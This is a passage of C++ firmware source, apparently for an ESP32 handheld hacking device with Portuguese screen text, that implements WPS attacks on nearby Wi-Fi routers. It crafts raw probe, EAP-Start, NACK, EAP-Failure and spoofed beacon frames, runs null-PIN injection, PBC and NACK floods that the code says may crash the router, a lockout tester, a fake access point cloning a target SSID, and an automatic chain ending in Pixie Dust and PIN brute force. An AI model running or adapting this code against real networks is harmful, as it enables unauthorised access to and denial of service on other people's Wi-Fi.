    for (int i = 0; i < num_pins && wps_attack_running; i++) {
        generateRandomMac(src_mac);

        // Probe Request
        memset(frame, 0, sizeof(frame));
        frame[0] = 0x40; frame[1] = 0x00;
        memcpy(&frame[4], target.bssid, 6);
        memcpy(&frame[10], src_mac, 6);
        memcpy(&frame[16], target.bssid, 6);
        frame[22] = (uint8_t)random(0, 255);
        int sslen = strlen(target.ssid);
        frame[24] = 0x00; frame[25] = (uint8_t)sslen;
        memcpy(&frame[26], target.ssid, sslen);
        int off = 26 + sslen;
        frame[off] = 0x01; frame[off+1] = 0x04;
        frame[off+2] = 0x82; frame[off+3] = 0x84;
        frame[off+4] = 0x8b; frame[off+5] = 0x96;
        off += 6;
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
        vTaskDelay(pdMS_TO_TICKS(50));

        // EAP-Start
        uint8_t eapst[40];
        memset(eapst, 0, sizeof(eapst));
        eapst[0] = 0x08; eapst[1] = 0x01;
        memcpy(&eapst[4], target.bssid, 6);
        memcpy(&eapst[10], src_mac, 6);
        memcpy(&eapst[16], target.bssid, 6);
        eapst[22] = (uint8_t)random(0, 255);
        eapst[24] = 0xAA; eapst[25] = 0xAA; eapst[26] = 0x03;
        eapst[30] = 0x88; eapst[31] = 0x8E;
        eapst[32] = 0x01; eapst[33] = 0x01;
        esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);

        for (int step = 0; step < 15 && wps_attack_running; step++) {
            if (millis() - start_time > MAX_ATTACK_TIME) {
                wps_attack_running = false;
                padprintln("Tempo maximo atingido!");
                break;
            }
            if (!wpsEnsureAPSTAMode()) {
                wps_attack_running = false;
                break;
            }

            drawMainBorderWithTitle("WPS Null PIN");
            tft.setTextColor(bruceConfig.priColor);
            char disp_buf[64];
            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
            padprintln(disp_buf);
            padprintln("");
            snprintf(disp_buf, sizeof(disp_buf), "%c Injetando: %s", spinner[spin_idx], null_pins[i]);
            padprintln(disp_buf);
            snprintf(disp_buf, sizeof(disp_buf), "Progresso: %d / %d", i+1, num_pins);
            padprintln(disp_buf);
            padprintln("");
            padprintln("Aguarde resposta do AP...");
            padprintln("ESC para parar");

            spin_idx = (spin_idx + 1) % 4;
            if (check(EscPress)) wps_attack_running = false;
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }

    if (wps_attack_running) {
        drawMainBorderWithTitle("WPS Null PIN");
        tft.setTextColor(TFT_CYAN);
        padprintln("");
        padprintln("Teste Concluido!");
        padprintln(String(num_pins) + " PINs Nulos testados.");
        padprintln("");
        padprintln("Por ser injecao direta (blind),");
        padprintln("conecte um monitor ou sniffer");
        padprintln("para ver se o AP aceitou o PIN.");
        padprintln("");
        padprintln("Pressione qualquer tecla");
        while (!check(AnyKeyPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    wpsDeinitInjectionMode();
    returnToMenu = true;
}

//================================================================================
// 5. WPS PBC FLOOD
//================================================================================

void wpsPBCFlood() {
    drawMainBorderWithTitle("WPS PBC Flood");
    padprintln("");
    padprintln("Escaneando redes WPS...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Alvo PBC Flood", target)) return;

    drawMainBorderWithTitle("WPS PBC Flood");
    padprintln("");
    padprintln("Preparando...");

    if (!wpsInitInjectionMode(target.channel)) return;

    uint8_t probe[72];
    uint32_t frame_count = 0;
    uint32_t total_frames = 0;
    uint32_t last_update = millis();
    wps_attack_running = true;
    const char spinner[] = {'|', '/', '-', '\\'};
    uint8_t spin_idx = 0;

    drawMainBorderWithTitle("WPS PBC Flood");
    tft.setTextColor(bruceConfig.priColor);
    padprintln("");
    padprintln("Alvo: " + String(target.ssid));
    padprintln("Iniciando injecao...");

    while (wps_attack_running) {
        uint8_t rand_mac[6];
        generateRandomMac(rand_mac);

        // Probe Request com PBC flag
        memset(probe, 0, sizeof(probe));
        probe[0] = 0x40; probe[1] = 0x00;
        memcpy(&probe[4], target.bssid, 6);
        memcpy(&probe[10], rand_mac, 6);
        memcpy(&probe[16], target.bssid, 6);
        probe[22] = (uint8_t)random(0, 255);
        int sslen = strlen(target.ssid);
        probe[24] = 0x00; probe[25] = (uint8_t)sslen;
        memcpy(&probe[26], target.ssid, sslen);
        int off = 26 + sslen;
        probe[off] = 0x01; probe[off+1] = 0x04;
        probe[off+2] = 0x82; probe[off+3] = 0x84;
        probe[off+4] = 0x8b; probe[off+5] = 0x96;
        off += 6;

        // WPS IE com PBC
        probe[off++] = 0xDD;
        probe[off++] = 9; // len
        probe[off++] = 0x00; probe[off++] = 0x50;
        probe[off++] = 0xF2; probe[off++] = 0x04;
        probe[off++] = 0x10; probe[off++] = 0x08; // Config Methods
        probe[off++] = 0x00; probe[off++] = 0x02;
        probe[off++] = 0x00; // PBC = 0x0080
        // Corrige: len real
        probe[off - 12] = (uint8_t)(off - (off - 11));

        esp_wifi_80211_tx(WIFI_IF_AP, probe, off, false);
        frame_count++;

        // Broadcast também
        memset(&probe[4], 0xFF, 6);
        memset(&probe[16], 0xFF, 6);
        generateRandomMac(rand_mac);
        memcpy(&probe[10], rand_mac, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, probe, off, false);
        frame_count++;

        total_frames += 2;

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("WPS PBC Flood");
            tft.setTextColor(bruceConfig.priColor);
            char disp_buf[64];
            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
            padprintln(disp_buf);
            snprintf(disp_buf, sizeof(disp_buf), "Canal: %d", target.channel);
            padprintln(disp_buf);
            padprintln("");
            snprintf(disp_buf, sizeof(disp_buf), "%c Total Frames : %lu", spinner[spin_idx], (unsigned long)total_frames);
            padprintln(disp_buf);
            snprintf(disp_buf, sizeof(disp_buf), "  Taxa Injecao : %lu fps", (unsigned long)frame_count * 2);
            padprintln(disp_buf);
            padprintln("");
            padprintln("O roteador pode travar o WPS");
            padprintln("ou reiniciar (DoS).");
            padprintln("");
            padprintln("ESC para parar");

            frame_count = 0;
            spin_idx = (spin_idx + 1) % 4;
            last_update = millis();
        }

        if (check(EscPress)) wps_attack_running = false;
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    wpsDeinitInjectionMode();
    returnToMenu = true;
}

//================================================================================
// 6. WPS LOCKOUT TESTER
//================================================================================

void wpsLockoutTester() {
    drawMainBorderWithTitle("WPS Lockout Test");
    padprintln("");
    padprintln("Escaneando redes WPS...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Alvo Lockout", target)) return;

    drawMainBorderWithTitle("Lockout Test");
    padprintln("");
    padprintln("Preparando...");

    if (!wpsInitInjectionMode(target.channel)) return;

    wps_attack_running = true;
    uint32_t attempts = 0;
    uint32_t last_update = millis();
    uint32_t start_time = millis();
    char pin_buf[9];
    uint8_t src_mac[6];
    uint8_t frame[72];

    while (wps_attack_running && attempts < 30) {
        if (millis() - start_time > MAX_ATTACK_TIME) {
            wps_attack_running = false;
            padprintln("Tempo maximo atingido!");
            break;
        }

        if (!wpsEnsureAPSTAMode()) {
            wps_attack_running = false;
            break;
        }
        wpsGeneratePin((uint32_t)random(0, 9999999), pin_buf);
        generateRandomMac(src_mac);

        // Probe Request
        memset(frame, 0, sizeof(frame));
        frame[0] = 0x40; frame[1] = 0x00;
        memcpy(&frame[4], target.bssid, 6);
        memcpy(&frame[10], src_mac, 6);
        memcpy(&frame[16], target.bssid, 6);
        frame[22] = (uint8_t)random(0, 255);
        int sslen = strlen(target.ssid);
        frame[24] = 0x00; frame[25] = (uint8_t)sslen;
        memcpy(&frame[26], target.ssid, sslen);
        int off = 26 + sslen;
        frame[off] = 0x01; frame[off+1] = 0x04;
        frame[off+2] = 0x82; frame[off+3] = 0x84;
        frame[off+4] = 0x8b; frame[off+5] = 0x96;
        off += 6;
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);

        // EAP-Start
        uint8_t eapst[40];
        memset(eapst, 0, sizeof(eapst));
        eapst[0] = 0x08; eapst[1] = 0x01;
        memcpy(&eapst[4], target.bssid, 6);
        memcpy(&eapst[10], src_mac, 6);
        memcpy(&eapst[16], target.bssid, 6);
        eapst[22] = (uint8_t)random(0, 255);
        eapst[24] = 0xAA; eapst[25] = 0xAA; eapst[26] = 0x03;
        eapst[30] = 0x88; eapst[31] = 0x8E;
        eapst[32] = 0x01; eapst[33] = 0x01;
        esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);

        attempts++;

        if (millis() - last_update > 2000) {
            uint32_t elapsed = (millis() - start_time) / 1000;
            drawMainBorderWithTitle("Lockout Test");
            tft.setTextColor(bruceConfig.priColor);
            char disp_buf[64];
            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
            padprintln(disp_buf);
            snprintf(disp_buf, sizeof(disp_buf), "PIN: %s", pin_buf);
            padprintln(disp_buf);
            padprintln("");
            snprintf(disp_buf, sizeof(disp_buf), "Tentativas: %lu/30", (unsigned long)attempts);
            padprintln(disp_buf);
            snprintf(disp_buf, sizeof(disp_buf), "Tempo: %lus", (unsigned long)elapsed);
            padprintln(disp_buf);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) wps_attack_running = false;
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    // Resultado
    uint32_t total_time = (millis() - start_time) / 1000;
    drawMainBorderWithTitle("Lockout Resultado");
    tft.setTextColor(TFT_CYAN);
    padprintln("");
    padprintln("AP: " + String(target.ssid));
    padprintln("Tentativas: " + String(attempts));
    padprintln("Tempo: " + String(total_time) + "s");
    padprintln("");
    padprintln("Verifique se o AP ainda");
    padprintln("responde a WPS ou se");
    padprintln("aplicou lockout.");
    padprintln("");
    padprintln("Pressione qualquer tecla");
    while (!check(AnyKeyPress)) vTaskDelay(100 / portTICK_PERIOD_MS);

    wpsDeinitInjectionMode();
    returnToMenu = true;
}

//================================================================================
// 7. WPS AP SPOOF
//================================================================================

void wpsAPSpoof() {
    drawMainBorderWithTitle("WPS AP Spoof");
    padprintln("");
    padprintln("Escaneando redes WPS...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Clonar AP WPS", target)) return;

    drawMainBorderWithTitle("WPS AP Spoof");
    padprintln("");
    padprintln("Criando AP falso...");

    // Desliga tudo, cria AP no canal alvo
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_AP);
    vTaskDelay(pdMS_TO_TICKS(300));
    WiFi.softAP("WPS_SPOOF", "", target.channel, 1, 4, true); // Use dummy SSID and hidden
    vTaskDelay(pdMS_TO_TICKS(300));

    uint8_t our_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, our_mac);

    wps_attack_running = true;
    uint32_t beacon_count = 0;
    uint32_t last_update = millis();
    uint8_t beacon[80];

    while (wps_attack_running) {
        memset(beacon, 0, sizeof(beacon));
        beacon[0] = 0x80; beacon[1] = 0x00;
        memset(&beacon[4], 0xFF, 6);
        memcpy(&beacon[10], our_mac, 6);
        memcpy(&beacon[16], our_mac, 6);
        beacon[22] = (uint8_t)random(0, 255);

        uint64_t ts = esp_timer_get_time();
        memcpy(&beacon[24], &ts, 8);
        beacon[32] = 0x64; beacon[33] = 0x00;
        beacon[34] = 0x31; beacon[35] = 0x04;

        int sslen = strlen(target.ssid);
        beacon[36] = 0x00; beacon[37] = (uint8_t)sslen;
        memcpy(&beacon[38], target.ssid, sslen);
        int off = 38 + sslen;

        beacon[off] = 0x01; beacon[off+1] = 0x04;
        beacon[off+2] = 0x82; beacon[off+3] = 0x84;
        beacon[off+4] = 0x8b; beacon[off+5] = 0x96;
        off += 6;

        beacon[off] = 0x03; beacon[off+1] = 0x01;
        beacon[off+2] = target.channel;
        off += 3;

        // WPS IE
        beacon[off++] = 0xDD;
        int ie_len_pos = off; off++;
        int ie_start = off;
        beacon[off++] = 0x00; beacon[off++] = 0x50;
        beacon[off++] = 0xF2; beacon[off++] = 0x04;
        beacon[off++] = 0x10; beacon[off++] = 0x44;
        beacon[off++] = 0x00; beacon[off++] = 0x01;
        beacon[off++] = 0x02; // WPS State: Configured
        beacon[off++] = 0x10; beacon[off++] = 0x08;
        beacon[off++] = 0x00; beacon[off++] = 0x02;
        beacon[off++] = 0x01; beacon[off++] = 0x88; // PIN+PBC

        beacon[ie_len_pos] = (uint8_t)(off - ie_start);

        esp_wifi_80211_tx(WIFI_IF_AP, beacon, off, false);
        beacon_count++;

        wifi_sta_list_t sta_list;
        uint32_t clients = 0;
        if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK) clients = sta_list.num;

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("WPS AP Spoof");
            tft.setTextColor(bruceConfig.priColor);
            char disp_buf[64];
            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
            padprintln(disp_buf);
            padprintln("Criando AP falso...");
            snprintf(disp_buf, sizeof(disp_buf), "Beacons enviados: %lu", (unsigned long)beacon_count);
            padprintln(disp_buf);
            snprintf(disp_buf, sizeof(disp_buf), "Clientes conectados: %lu", (unsigned long)clients);
            padprintln(disp_buf);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) wps_attack_running = false;
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
    vTaskDelay(pdMS_TO_TICKS(100));
    returnToMenu = true;
}

//================================================================================
// 8. WPS NACK FLOOD
//================================================================================

void wpsNACKFlood() {
    drawMainBorderWithTitle("WPS NACK Flood");
    padprintln("");
    padprintln("Escaneando redes WPS...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Alvo NACK Flood", target)) return;

    drawMainBorderWithTitle("NACK Flood");
    padprintln("");
    padprintln("Preparando...");

    if (!wpsInitInjectionMode(target.channel)) return;

    uint32_t frame_count = 0;
    uint32_t last_update = millis();
    wps_attack_running = true;

    while (wps_attack_running) {
        uint8_t rand_mac[6];
        generateRandomMac(rand_mac);

        // NACK via EAP frame
        uint8_t nack[64];
        memset(nack, 0, sizeof(nack));
        nack[0] = 0x08; nack[1] = 0x01; // Data, ToDS
        memcpy(&nack[4], target.bssid, 6);
        memcpy(&nack[10], rand_mac, 6);
        memcpy(&nack[16], target.bssid, 6);
        nack[22] = (uint8_t)random(0,255);

        // LLC/SNAP + 802.1X
        nack[24] = 0xAA; nack[25] = 0xAA; nack[26] = 0x03;
        nack[30] = 0x88; nack[31] = 0x8E;
        nack[32] = 0x01; // 802.1X version
        nack[33] = 0x00; // type: EAP
        nack[34] = 0x00; nack[35] = 0x1E; // len

        // EAP Response
        nack[36] = 0x02; // Code: Response
        nack[37] = (uint8_t)random(1, 255);
        nack[38] = 0x00; nack[39] = 0x1E;
        nack[40] = 0xFE; // Type: Expanded

        // WFA vendor
        nack[41] = 0x00; nack[42] = 0x37;
        nack[43] = 0x2A; nack[44] = 0x00;
        nack[45] = 0x00; nack[46] = 0x00;
        nack[47] = 0x01;
        nack[48] = 0x04; // OpCode: WSC_NACK
        nack[49] = 0x00;

        // Version TLV
        nack[50] = 0x10; nack[51] = 0x4A;
        nack[52] = 0x00; nack[53] = 0x01;
        nack[54] = 0x10;

        // Msg Type: NACK
        nack[55] = 0x10; nack[56] = 0x22;
        nack[57] = 0x00; nack[58] = 0x01;
        nack[59] = 0x0E;

        esp_wifi_80211_tx(WIFI_IF_AP, nack, 60, false);
        frame_count++;

        // EAP-Failure
        uint8_t fail[44];
        memset(fail, 0, sizeof(fail));
        fail[0] = 0x08; fail[1] = 0x01;
        memcpy(&fail[4], target.bssid, 6);
        memcpy(&fail[10], rand_mac, 6);
        memcpy(&fail[16], target.bssid, 6);
        fail[22] = (uint8_t)random(0,255);
        fail[24] = 0xAA; fail[25] = 0xAA; fail[26] = 0x03;
        fail[30] = 0x88; fail[31] = 0x8E;
        fail[32] = 0x01; fail[33] = 0x00;
        fail[34] = 0x00; fail[35] = 0x04;
        fail[36] = 0x04; // Code: Failure
        fail[37] = (uint8_t)random(1,255);
        fail[38] = 0x00; fail[39] = 0x04;

        esp_wifi_80211_tx(WIFI_IF_AP, fail, 40, false);
        frame_count++;

        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("WPS NACK Flood");
            tft.setTextColor(bruceConfig.priColor);
            char disp_buf[64];
            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
            padprintln(disp_buf);
            padprintln("");
            snprintf(disp_buf, sizeof(disp_buf), "Frames: %lu", (unsigned long)frame_count);
            padprintln(disp_buf);
            snprintf(disp_buf, sizeof(disp_buf), "Canal: %d", target.channel);
            padprintln(disp_buf);
            padprintln("");
            padprintln("ESC para parar");
            frame_count = 0;
            last_update = millis();
        }

        if (check(EscPress)) wps_attack_running = false;
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    wpsDeinitInjectionMode();
    returnToMenu = true;
}

//================================================================================
// 9. WPS AUTO ALL
//================================================================================

// Função auxiliar interna para executar o Auto All sem pedir seleção de alvo de novo
static void runAutoAllSequence(const WPSNetworkInfo& target) {
    drawMainBorderWithTitle("WPS Auto All");
    padprintln("");
    padprintln("Iniciando sequencia em:");
    padprintln(String(target.ssid));
    padprintln("");
    padprintln("1. Null PIN");
    padprintln("2. Pixie Dust");
    padprintln("3. PIN Brute Force");
    padprintln("");
    padprintln("Pressione qualquer tecla...");
    while (!check(AnyKeyPress)) vTaskDelay(100 / portTICK_PERIOD_MS);

    // 1. Null PIN (internal equivalent, simplified)
    drawMainBorderWithTitle("Auto -> Null PIN");
    padprintln("Testando Null PINs...");
    if (wpsInitInjectionMode(target.channel)) {
        const char* null_pins[] = {"00000000", "12345670", "00000001", "11111114"};
        uint8_t src_mac[6];
        uint8_t frame[72];
        bool stop_auto = false;

        for (int i = 0; i < 4 && !stop_auto; i++) {
            generateRandomMac(src_mac);
            // Probe
            memset(frame, 0, sizeof(frame));
            frame[0] = 0x40; frame[1] = 0x00;
            memcpy(&frame[4], target.bssid, 6);
            memcpy(&frame[10], src_mac, 6);
            memcpy(&frame[16], target.bssid, 6);
            int sslen = strlen(target.ssid);
            frame[24] = 0x00; frame[25] = (uint8_t)sslen;
            memcpy(&frame[26], target.ssid, sslen);
            int off = 26 + sslen;
            frame[off] = 0x01; frame[off+1] = 0x04;
            frame[off+2] = 0x82; frame[off+3] = 0x84;
            frame[off+4] = 0x8b; frame[off+5] = 0x96;
            esp_wifi_80211_tx(WIFI_IF_AP, frame, off + 6, false);

            // EAP Start
            uint8_t eapst[40];
            memset(eapst, 0, sizeof(eapst));
            eapst[0] = 0x08; eapst[1] = 0x01;
            memcpy(&eapst[4], target.bssid, 6);
            memcpy(&eapst[10], src_mac, 6);
            memcpy(&eapst[16], target.bssid, 6);
            eapst[24] = 0xAA; eapst[25] = 0xAA; eapst[26] = 0x03;
            eapst[30] = 0x88; eapst[31] = 0x8E; eapst[32] = 0x01; eapst[33] = 0x01;
            esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);

            drawMainBorderWithTitle("Auto -> Null PIN");
            padprintln("Injetando: " + String(null_pins[i]));
            padprintln("ESC para cancelar AutoAll");

            for(int w=0; w<20; w++) {
                if (check(EscPress)) { stop_auto = true; break; }
                vTaskDelay(pdMS_TO_TICKS(100));
            }
        }
        wpsDeinitInjectionMode();
        if (stop_auto) return;
    }

    // 2. Pixie Dust
    drawMainBorderWithTitle("Auto -> Pixie Dust");
    padprintln("Ativando Pixie Dust...");
    wpsPixieDustRaw(); // Use the existing raw implementation for capture

    // 3. Brute Force
    drawMainBorderWithTitle("Auto -> PIN Brute");
    padprintln("Iniciando Brute Force...");
    wpsPinBruteForceNative(); // Call existing native brute force
}

void wpsAutoAll() {
    drawMainBorderWithTitle("WPS Auto All");
    padprintln("");
    padprintln("Escaneando redes WPS...");

    auto networks = scanWPSNetworks();
    int sel = wpsInternalSelectTarget(networks, "Alvo Auto All");
    if (sel < 0) return;
    WPSNetworkInfo target = networks[sel];

    if (target.cracked) {
        drawMainBorderWithTitle("Aviso");
        padprintln("");
        padprintln("Esta rede ja foi quebrada!");
        padprintln("PIN: " + String(target.cracked_pin));
        padprintln("");
        padprintln("Deseja atacar mesmo assim?");
        padprintln("SEL: Sim   ESC: Nao");
        while (true) {
            if (check(EscPress)) { returnToMenu = true; return; }
            if (check(SelPress)) break;
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }
    }

    runAutoAllSequence(target);
    returnToMenu = true;
}
